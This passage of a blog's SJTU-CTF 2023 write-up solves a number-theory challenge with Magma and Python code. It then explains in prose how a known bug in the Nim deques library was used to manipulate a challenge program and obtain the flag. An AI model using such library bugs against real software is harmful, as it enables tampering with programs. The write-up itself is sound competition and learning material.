style="height:1.87689em;vertical-align:-.7693300000000001em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord mathnormal" style="margin-right:.04398em">z</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.677em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.7693300000000001em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.9880000000000002em;vertical-align:-.8804400000000001em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.677em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.04398em">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.8804400000000001em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord"><span class="mspace">&nbsp;</span></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">{</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">1</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">}</span></span></span></span></span></p><p>Google 检索了一下，找到了 Quora 上的<a target="_blank" rel="noopener" href="https://qr.ae/prJaI1">这个回答</a>，贴心地提供了一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">k=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">4</span></span></span></span> 时的 Magma 求解程序。</p><pre><code class="hljs go"><span class="hljs-comment">// </span>
<span class="hljs-comment">// For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID) </span>
<span class="hljs-comment">// Code is commented to explain how to solve the meme  (https://preview.redd.it/p92108lekoq11.jpg?width=367&amp;format=.jpg?width=1920&amp;auto=webp&amp;s=e0c84917c3d7e130cad06f9ab5a85634b0c88cfb) </span>
<span class="hljs-comment">// </span>
<span class="hljs-comment">// x/(y+z) + y/(x+z) + z/(x+y) = 4 </span>
<span class="hljs-comment">// </span>
<span class="hljs-comment">// This is the smallest solution: </span>
<span class="hljs-comment">// x=4373612677928697257861252602371390152816537558161613618621437993378423467772036 </span>
<span class="hljs-comment">// y=36875131794129999827197811565225474825492979968971970996283137471637224634055579 </span>
<span class="hljs-comment">// z=154476802108746166441951315019919837485664325669565431700026634898253202035277999 </span>
<span class="hljs-comment">// </span>
<span class="hljs-comment">// Paste in the site below to execute this code see this result, also read the comments here to understand.  </span>
<span class="hljs-comment">// The last part of the prints() after executed shows you the solution above. </span>
<span class="hljs-comment">// http://magma.maths.usyd.edu.au/calc/ </span>
<span class="hljs-comment">// Eduardo Ruiz Duarte  </span>
<span class="hljs-comment">// toorandom@gmail.com </span>
<span class="hljs-comment">// </span>
 
 
<span class="hljs-comment">// First we define our environment for our "problem" </span>
 
R&lt;x,y,z&gt; := RationalFunctionField(Rationals(),<span class="hljs-number">3</span>); 
 
problem := ((x/(y+z) + y/(x+z) + z/(x+y)) - <span class="hljs-number">4</span>) ; 
<span class="hljs-comment">// first note that we know a point after some computation (-1,4,11) that </span>
<span class="hljs-comment">// works but has a negative coordinate, the following function returns 0, which means that  </span>
<span class="hljs-comment">// (x/(y+z) + y/(x+z) + z/(x+y)) - 4 = 0    (just put the -4 in the other side) </span>
Evaluate(problem,[<span class="hljs-number">-1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>]); 
 
<span class="hljs-comment">// after the previous returned 0 , we know the point fits, we continue. </span>
 
<span class="hljs-comment">// we multiply by all the denominators of "problem" to get a polynomials </span>
problem*Denominator(problem); 
<span class="hljs-comment">// we obtain a polynomial without denominators x^3 - 3*x^2*y - 3*x^2*z - 3*x*y^2 - 5*x*y*z - 3*x*z^2 + y^3 - 3*y^2*z - 3*y*z^2 + z^3 </span>
<span class="hljs-comment">// We see is cubic, three variables, and every  term has the same degree (3) , therefore this is a cubic  </span>
<span class="hljs-comment">// homogeneous curve,  we know there is a point which is not the solution we want </span>
<span class="hljs-comment">// the point (-1,4,11) fits in the original "problem" so it should fit in this new curve without denominators too (since no denominator becomes 0) </span>
 
<span class="hljs-comment">// We transform this equation to a "curve" in Projecive space of dimension 2 </span>
P2&lt;x,y,z&gt; := ProjectiveSpace(Rationals(),<span class="hljs-number">2</span>); 
C := Curve(P2,x^<span class="hljs-number">3</span> - <span class="hljs-number">3</span>*x^<span class="hljs-number">2</span>*y - <span class="hljs-number">3</span>*x^<span class="hljs-number">2</span>*z - <span class="hljs-number">3</span>*x*y^<span class="hljs-number">2</span> - <span class="hljs-number">5</span>*x*y*z - <span class="hljs-number">3</span>*x*z^<span class="hljs-number">2</span> + y^<span class="hljs-number">3</span> - <span class="hljs-number">3</span>*y^<span class="hljs-number">2</span>*z - <span class="hljs-number">3</span>*y*z^<span class="hljs-number">2</span> + z^<span class="hljs-number">3</span>); 
 
<span class="hljs-comment">// fit the point to the curve C (no error is returned) </span>
Pt := C![<span class="hljs-number">-1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>]; 
 
<span class="hljs-comment">// Since all cubic homogeneous curve with at least one point define an elliptc curve, we can transform  </span>
<span class="hljs-comment">// this curve C to an elliptc curve form and just like in cryptography, we will add this known point (mapped to the corresponded curve) </span>
<span class="hljs-comment">// with itself until we get only positive coordinates and go back to C (original Problem) </span>
 
<span class="hljs-comment">// Below, E is the curve, f is the map that maps   Points f:C -&gt; E  (C is our original curve without denominators, both curves C,E are equivalent  </span>
<span class="hljs-comment">// but in E we can "Add points" to get another point of E. </span>
<span class="hljs-comment">// and with f^-1 we can return to the point of C which is our original solution </span>
 
E,f := EllipticCurve(C); 
 
<span class="hljs-comment">//g is the inverse g:E-&gt;C  , f:C-&gt;E     so g(f([-1,4,11]))=[-1,4,11] </span>
g := f^<span class="hljs-number">-1</span>; 
 
<span class="hljs-comment">// We try adding the known point Pt=[-1,4,11] mapped to E, 2..100 times </span>
<span class="hljs-comment">// to see if when mapped back the added point to C gives positive coordinates </span>
<span class="hljs-comment">//, this is 2*Pt, 3*Pt, ...., 100*Pt  and then mapping back to C all these. </span>
<span class="hljs-keyword">for</span> n:= <span class="hljs-number">1</span> to <span class="hljs-number">100</span> do 
 
<span class="hljs-comment">// we calculate n times the point of C, known [-1,4,11] but mapped (via f) inside E (where we can do the "n times")  </span>
    nPt_inE:=n*f(Pt); 
 
<span class="hljs-comment">// we take this point on E back to C via f^-1  (which we renamed as g) </span>
    nPt_inC:=g(nPt_inE); 
 
<span class="hljs-comment">//We obtain each coordinate of this point to see if is our positive solution, </span>
<span class="hljs-comment">// here MAGMA scales automatically the point such as Z is one always 1,  </span>
<span class="hljs-comment">// so it puts the same denominators in X,Y, so numerators of X,Y are our  </span>
<span class="hljs-comment">//solutions and denominator our Z,  think of  P=(a/c,b/c,1)   then c*P=(a,b,c) </span>
    X := Numerator(nPt_inC[<span class="hljs-number">1</span>]); 
    Y := Numerator(nPt_inC[<span class="hljs-number">2</span>]); 
    Z := Denominator(nPt_inC[<span class="hljs-number">1</span>]); 
 
printf <span class="hljs-string">"X=%o\nY=%o\nZ=%o\n"</span>,X,Y,Z; 
 
<span class="hljs-comment">// We check the condition for our original problem. </span>
  <span class="hljs-keyword">if</span> ((X gt <span class="hljs-number">0</span>) and (Y gt <span class="hljs-number">0</span>)) then 
       printf(<span class="hljs-string">"GOT IT!!! x=apple, y=banana, z=pineapple, check the above solution\n"</span>); 
     <span class="hljs-keyword">break</span>; 
  <span class="hljs-keyword">else</span> 
     printf <span class="hljs-string">"Nee, some coordinate was negative above, I keep in the loop\n\n"</span>; 
  end <span class="hljs-keyword">if</span>; 
 
end <span class="hljs-keyword">for</span>;    
 
<span class="hljs-comment">// We check the solution fits in the original problem </span>
<span class="hljs-keyword">if</span> Evaluate(problem, [X,Y,Z]) eq <span class="hljs-number">0</span> then 
    printf <span class="hljs-string">"I evaluated the point to the original problem and yes, it worked!\n"</span>; 
<span class="hljs-keyword">else</span> 
    printf <span class="hljs-string">"Mmm this cannot happen!\n"</span>; 
end <span class="hljs-keyword">if</span>;</code></pre><p>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span></span></span></span> 取其他值的情况，只需要提供一组整数特解（不需要正整数），改动一下程序里的方程和特解，即可求出正整数解。</p><p>至于如何找到一组整数特解，可以用 Mathemetica 或这个 Python 程序：</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd
n = <span class="hljs-number">100</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">k</span>):
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-n, n + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-n, n + <span class="hljs-number">1</span>):
            <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, n + <span class="hljs-number">1</span>):
                <span class="hljs-keyword">if</span> gcd(x, gcd(y, z)) == <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">if</span> x**<span class="hljs-number">3</span> + y**<span class="hljs-number">3</span> + z**<span class="hljs-number">3</span> - (k-<span class="hljs-number">1</span>) * x**<span class="hljs-number">2</span> * (y + z) - (k-<span class="hljs-number">1</span>) * y**<span class="hljs-number">2</span> * (
                            z + x) - (k-<span class="hljs-number">1</span>) * z**<span class="hljs-number">2</span> * (x + y) - (<span class="hljs-number">2</span>*k-<span class="hljs-number">3</span>) * x * y * z == <span class="hljs-number">0</span>:
                        <span class="hljs-built_in">print</span>((x, y, z))


calc(<span class="hljs-number">10</span>) <span class="hljs-comment">#2, 4, 6, 8, 10, 12, 14</span></code></pre><p>最后解下来发现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">k=8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">8</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">k=12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mord">2</span></span></span></span> 用这个方法解不出正整数解，不过解出五组也够了，提交即可拿到 flag。</p><p>附上解出的答案（每三行对应一组解，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">k=8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">8</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">k=12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mord">2</span></span></span></span> 解不出所以用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span></span></span></span> 占位）。</p><pre><code class="hljs">1
1
3
4373612677928697257861252602371390152816537558161613618621437993378423467772036
36875131794129999827197811565225474825492979968971970996283137471637224634055579
154476802108746166441951315019919837485664325669565431700026634898253202035277999
1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023
2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447
20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557
1
1
1
4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209
269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977
221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347
1
1
1
35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767
1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157
87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</code></pre><h3 id="toms-cheese"><a class="markdownIt-Anchor" href="#toms-cheese"></a> Tom’s Cheese</h3><p>拿到了 Nim 程序源代码，读了好几遍感觉没啥问题啊，怎么会有漏洞呢？即使在 Hint 给出之后，我依然百思不得其解，因为我下意识地认为 GitHub 上 Closed 的 Issue 应该都已经在最新版本（1.6.10）中被修复。</p><p>直到最近（3月10日） Nim 发布了 1.6.12 版本，我看了眼更新日志，发现竟然提到了修复了 <code>deques</code> 组件的一个 bug，于是赶紧翻找<a target="_blank" rel="noopener" href="https://github.com/nim-lang/Nim/pull/21284">对应的 PR</a>。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5118f01485c7843f0fb586ae3cbc8ce8.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5118f01485c7843f0fb586ae3cbc8ce8.png?width=1920" srcset="/loading.gif" alt=""></p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_13714f4828484f468c30716fc61418ec.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_13714f4828484f468c30716fc61418ec.png?width=1920" srcset="/loading.gif" alt=""></p><p>有意思的是，这么严重的一个 bug 明明一月份就提出并修复了，怎么拖到现在才发布 Release 1.6.12。而 Release 1.6.10 是去年11月发布的，自然不会包括这个 bug 的修复，于是就给了我们可乘之机。</p><p><code>deques</code> 实现的是一个顺序存储的双端循环队列，仔细看了一下发现触发 bug 的条件是队列中元素个数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">2^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.849108em;vertical-align:0"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.849108em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03148em">k</span></span></span></span></span></span></span></span></span></span></span> 个，此时 <code>shrink(fromFirst = 0, fromLast = 1)</code> 就会出现不正确的结果，即队首元素变成了0。</p><p>那么利用这一个 bug，Tom 只要把奶酪的数量先搞成16个，然后用选项4喂 Jerry 0个，Tuffy 1个，于是队首的奶酪就神奇地变成了零卡的过期奶酪，再喂给 Jerry，这样 Jerry 的健康值就会下降，然后不停重复这一过程直至 Jerry 不健康了，就拿到了 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5460f00ece6b18a41a33db401c15f4be.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5460f00ece6b18a41a33db401c15f4be.png?width=1920" srcset="/loading.gif" alt=""></p><p>（flag 说得对，不过我杀死的好像是 Jerry 不是 Tuffy 吧hhh)</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>总的来说，这次比赛体验很棒。题目的难度设置合理，让我这种 CTF 零基础小白在不熟悉的方向（比如 Crypto、Reverse、Pwnable）能边学边做，打完比赛又学到了很多新知识。同时题目也足够新颖，很有创意，几乎没有直接照搬的套路化的东西，是需要自己去分析思考的。当然还有奇安信赞助的丰厚奖金，做题的动力直接拉满。</p><p>最后拿了11847分，总排名#7，意外地挤进了前十，被大佬们包围着瑟瑟发抖。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/13/d561b8990d0daa79d65cb25bc1ebc665.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/13/d561b8990d0daa79d65cb25bc1ebc665.png?width=1920" srcset="/loading.gif" alt=""></p></body></html></div><div class="license"><div class="license-title">SJTU-CTF 2023 Writeup</div><div class="license-link"><a href="https://blog.hans362.cn/post/sjtu-ctf-2023-writeup/">https://blog.hans362.cn/post/sjtu-ctf-2023-writeup/</a></div><div class="license-meta"><div class="license-meta-item"><div class="license-meta-title">本文作者</div><div class="license-meta-text">Hans362</div></div><div class="license-meta-item"><div class="license-meta-title">最后更新</div><div class="license-meta-text">2023-03-16</div></div><div class="license-meta-item"><div class="license-meta-title">许可协议</div><div class="license-meta-text"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="nofollow noopener noreferrer" target="_blank">CC BY-NC-SA 4.0</a></div></div></div><div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div></div><div class="post-footer__cats"><a href="/categories/%E6%B0%B4/" class="post-cats__link button">水</a><a href="/tags/Web/" class="post-tags__link button"># Web</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-tags__link button"># 网络安全</a><a href="/tags/CTF/" class="post-tags__link button"># CTF</a><a href="/tags/Crypto/" class="post-tags__link button"># Crypto</a><a href="/tags/Reverse/" class="post-tags__link button"># Reverse</a><a href="/tags/Pwnable/" class="post-tags__link button"># Pwnable</a><a href="/tags/Misc/" class="post-tags__link button"># Misc</a><a href="/tags/Writeup/" class="post-tags__link button"># Writeup</a><a href="/tags/%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/" class="post-tags__link button"># 解题报告</a></div></article><div class="nav"><div class="nav__prev"><a href="/post/weekly-29/" class="nav__link"><div><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg></div><div><div class="nav__label">上一篇</div><div class="nav__title">周记#29</div></div></a></div><div class="nav__next"><a href="/post/2022-annual-report/" class="nav__link"><div><div class="nav__label">下一篇</div><div class="nav__title">2022年终总结</div></div><div><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg></div></a></div></div><div class="post__sponsers card"><div class="sponser-label">喜欢这篇文章吗？考虑支持一下作者吧～</div><a class="sponser-button button" href="https://afdian.net/@hans362" rel="external nofollow noreferrer" target="_blank" data-type="afdian">爱发电</a> <a class="sponser-button button" data-type="alipay">支付宝<img class="sponser-qrcode" src="https://hans362-img.oss.0vv0.top/2021/08/05/68281340.jpg"></a></div><div class="post__comments post__with-toc card" id="comment"><h4>评论</h4><div id="disqus_thread">您所在的地区可能无法访问 Disqus 评论系统，请切换网络环境再尝试。</div></div></div></main><footer><p class="footer-copyright">Copyright © 2017&nbsp;-&nbsp;2025 <a href="/">Hans362 &#39;s Blog</a></p><p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8746554831230893" data-ad-slot="6356225601" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></footer></div><script defer src="https://blog.hans362.cn/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js"></script><script>window.lazyLoadOptions={elements_selector:".lazy"}</script><script async defer data-website-id="5d181692-8a81-4c20-a282-cee87a6b90ef" src="https://analytics.0vv0.top/vue.js"></script><script src="/js/pageviews.js"></script><link rel="stylesheet" href="https://blog.hans362.cn/npm/katex@0.16.0/dist/katex.min.css" crossorigin="anonymous"><script>function loadComment(){let n,e;(n=document.createElement("script")).src="https://blog.hans362.cn/js/disqus.js",document.body.appendChild(n),n.onload=()=>{new DisqusJS({shortname:"hans362-s-blog",siteName:"Hans362 &#39;s Blog",api:"https://api-v3.hans362.cn/",apikey:"8Z1UVT4UOk22yNyk9MhpqQ0FLb27Hb1bpV066b4v9zOFie0GQ6VCoJ9TJwoGlCVF",admin:"hans362",identifier:"post/sjtu-ctf-2023-writeup/",url:"https://blog.hans362.cn/post/sjtu-ctf-2023-writeup/",nesting:"4"})},(e=document.createElement("link")).rel="stylesheet",e.href="https://blog.hans362.cn/css/disqusjs.css",document.head.appendChild(e)}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent),supportsIntersectionObserver=runningOnBrowser&&"IntersectionObserver"in window;setTimeout(function(){var e;!isBot&&supportsIntersectionObserver?(e=new IntersectionObserver(function(n){n[0].isIntersecting&&(loadComment(),e.disconnect())},{threshold:[0]})).observe(document.getElementById("comment")):loadComment()},1)</script></body></html>